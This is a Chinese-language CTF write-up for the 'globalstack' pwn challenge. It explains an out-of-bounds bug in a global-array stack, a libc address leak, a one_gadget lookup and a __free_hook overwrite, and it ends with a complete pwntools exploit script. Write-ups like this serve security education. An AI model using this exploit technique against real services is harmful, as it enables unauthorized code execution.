
# TSCCTF_2025-globalstack

## globalstack

> oob + leak libc address + one gadget + Overwrite free_hook

![image](https://hackmd.io/_uploads/rkRZ3adcyl.png)

```shell
├── docker-compose.yml
├── Dockerfile
├── share
│   ├── flag
│   ├── globalstack
│   ├── globalstack.c
│   ├── ld-2.31.so
│   ├── libc-2.31.so
│   └── run.sh
└── xinetd
```

題目給了一個 docker 檔案，並且給了 libc 檔案

查看 binary 的相關資訊
```shell
❯ file globalstack
globalstack: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9905208f9b5fa3b5050ab29868ea7ef73039aa06, for GNU/Linux 3.2.0, not stripped
```
他是 x86-64 架構下的程式
```gdb
pwndbg> checksec 
File:     /home/younglee/Desktop/test/globalstack/share/globalstack
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
保護機制全開
然後查看他的 source code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#define MAX_STACK_SIZE 20
#define MAX_INPUT_SIZE 25
int64_t stack[MAX_STACK_SIZE];
int64_t* top = stack - 1;

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    char *input = malloc(MAX_INPUT_SIZE);
    char *command = malloc(MAX_INPUT_SIZE);
    int64_t value;
    puts("Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'");

    while (1) {
        printf(">> ");
        fgets(input, MAX_INPUT_SIZE, stdin);
        sscanf(input, "%s", command);

        if (strcmp(command, "push") == 0) {
            if (sscanf(input, "%*s %ld", &value) == 1) {
                top += 1;
                *top = (int64_t)value;
                printf("Pushed %ld to stack\n", value);
            } else {
                printf("Invalid push.\n");
            }
        } else if (strcmp(command, "pop") == 0) {
            printf("Popped %ld from stack\n", *top);
            top -= 1;
        } else if (strcmp(command, "show") == 0) {
            printf("Stack top: %ld\n", *top);
        } else if (strcmp(command, "exit") == 0) {
            break;
        }
        else if (strcmp(command, "help") == 0) {
            puts("Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'");
        } else {
            printf("Unknown command: %s\n", command);
        }
    }
    free(input);
    free(command);
    return 0;
}
```
跟 localstack 一樣的都是實作一個 stack 操作，但是這題將 stack 的資料變成 global variable
- local variable : 存放在 stack 中
- global variable : 存放在 .bss(未初始化靜態變數) .data(已初始化靜態變數) 段中

他的 top 沒有做範圍限制，所以可以 OOB，那我們的操作一樣先將資料 pop 出來看他會 leak 出甚麼東西

:::warning
請在操做前 patch binary 不然 libc 的 offset 會不同
:::

用 ida 查看 stack 的 memory 附近有什麼
![image](https://hackmd.io/_uploads/BytXPkYc1l.png)
可以看到在 stack 上面存放了 stdin 的 libc 位置
```shell
Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'
>> pop
Popped 0 from stack
>> pop
Popped 140737353881984 from stack # 7FFFF7FC1980
>>  
```

```gdb
pwndbg> x/10i 0x7FFFF7FC1980 
   0x7ffff7fc1980 <_IO_2_1_stdin_>:     mov    esp,DWORD PTR [rax]
   0x7ffff7fc1982 <_IO_2_1_stdin_+2>:   lods   eax,DWORD PTR ds:[rsi]
   0x7ffff7fc1983 <_IO_2_1_stdin_+3>:   sti    
   0x7ffff7fc1984 <_IO_2_1_stdin_+4>:   add    BYTE PTR [rax],al
   0x7ffff7fc1986 <_IO_2_1_stdin_+6>:   add    BYTE PTR [rax],al
   0x7ffff7fc1988 <_IO_2_1_stdin_+8>:   add    ebx,DWORD PTR [rdx]
   0x7ffff7fc198a <_IO_2_1_stdin_+10>:  cld    
   0x7ffff7fc198b <_IO_2_1_stdin_+11>:  idiv   edi
   0x7ffff7fc198d <_IO_2_1_stdin_+13>:  jg     0x7ffff7fc198f <_IO_2_1_stdin_+15>
   0x7ffff7fc198f <_IO_2_1_stdin_+15>:  add    BYTE PTR [rbx],al
```
那我們有了這個 libc 的地址可以幹嘛?
- 這次我們沒有後門讓我們跳了，那就要考慮 one_gadget 或是 ROP
    - 剛好他有給我們 libc 的版本可以利用
    - 也能算出 ASLR 的 base address

先算出 ASLR 的 base address

- 利用剛剛 leak 出來的 function 在 libc 中找出 offset 就可以知道 ASLR 的 base

利用 gdb 找到 libc 的起始位置
然後
```gdb
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/globalstack-patch
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/globalstack-patch
    0x555555556000     0x555555557000 r--p     1000   2000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/globalstack-patch
    0x555555557000     0x555555558000 r--p     1000   2000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/globalstack-patch
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/globalstack-patch
    0x555555559000     0x55555555b000 rw-p     2000   5000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/globalstack-patch
    0x55555555b000     0x55555557c000 rw-p    21000      0 [heap]
    0x7ffff7dd3000     0x7ffff7dd5000 rw-p     2000      0 [anon_7ffff7dd3]
--->0x7ffff7dd5000     0x7ffff7df7000 r--p    22000      0 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/libc-2.31.so
    0x7ffff7df7000     0x7ffff7f6f000 r-xp   178000  22000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/libc-2.31.so
    0x7ffff7f6f000     0x7ffff7fbd000 r--p    4e000 19a000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/libc-2.31.so
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000 1e7000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/libc-2.31.so
    0x7ffff7fc1000     0x7ffff7fc3000 rw-p     2000 1eb000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/libc-2.31.so
    0x7ffff7fc3000     0x7ffff7fc9000 rw-p     6000      0 [anon_7ffff7fc3]
    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]
    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]
    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/ld-2.31.so
    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/ld-2.31.so
    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/ld-2.31.so
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/ld-2.31.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /home/younglee/Desktop/TSCCTF/globalstack/chal/share/ld-2.31.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```
0x7ffff7dd5000 是 libc 的起始位置

==IO_2_1_stdin offset==  = 0x7ffff7fc1980 - 0x7ffff7dd5000 = 0x1ec980

- base address = ==IO_2_1_stdin== - ==IO_2_1_stdin offset== ( 0x1ec980 )


有了 ASLR base 那就先嘗試 one_gadget 
```bash
❯ one_gadget libc-2.31.so
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```
可以看到有三個可以嘗試的 one_gadget

那我們該如何跳到 one_gadget 上?

根據上題我們還是可以將 top 指到我們想要的地方，然後填入 one_gadget 的地址然後觸發他

首先我們要先找到 top 指標

![image](https://hackmd.io/_uploads/By8Ve9K51g.png)
他跟上一題一樣 top 的 memory 位置在 stack 的上方，所以我們可以一直 pop 將指針指到 top 上然後再填入我們要的資料

我們應該要 pop 六次 ==0x4030 - 0x4010 = 0x20，pop 一次是噴出 8 byte ( int64 )==
```
Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'
>> pop
Popped 0 from stack
>> pop
Popped 140737353881984 from stack # <--- stdin@GLIBC
>> pop
Popped 0 from stack
>> pop
Popped 140737353885344 from stack
>> pop
Popped 0 from stack
>> pop
Popped 93824992247824 from stack # <--- top 所在地
>> 
```
然後我們要跳去哪裡?
我們看到程式碼後面有 free() 所以試著將 top 指到 __free_hook 再將他改寫成 one_gadget 最後執行exit 觸發 free 執行 one_gadget
那要先找到 __free_hook
```gdb
pwndbg> p &__free_hook
$2 = (<data variable, no debug info> *) 0x7ffff7fc3e48 <__free_hook>
```
0x7ffff7fc3e48 - 0x7ffff7dd5000 = 0x1eee48

完整 exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./globalstack-patch")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def main():
    r = process("./globalstack-patch")
    r = remote("0.0.0.0","11101")
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop") # leak libc base address
    IO_2_1_stdin = int(r.recvline().decode().split(" ")[1])
    log.success(f"IO_2_1_stdin address : {hex(IO_2_1_stdin)}")
    
    libc_offset = libc.symbols["_IO_2_1_stdin_"]
    log.success(f"libc offect : {hex(libc_offset)}") # 0x1ec980
    libc_base = IO_2_1_stdin - libc_offset
    log.success(f"libc base : {hex(libc_base)}")
    
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop") # find top address

    free_hook = libc_base + 0x1eee48
    log.success(f"__free_hook : {hex(free_hook)}")
    one_gadget = libc_base + 0xe3b01
    log.success(f"one_gadget : {hex(one_gadget)}")
    r.sendlineafter(">> ",b"push " + str(free_hook - 8).encode())
    r.sendlineafter(">> ",b"push " + str(one_gadget).encode())
    r.sendlineafter(">> ",b"exit")
    
    r.interactive()


if __name__ == "__main__":
    main()

```
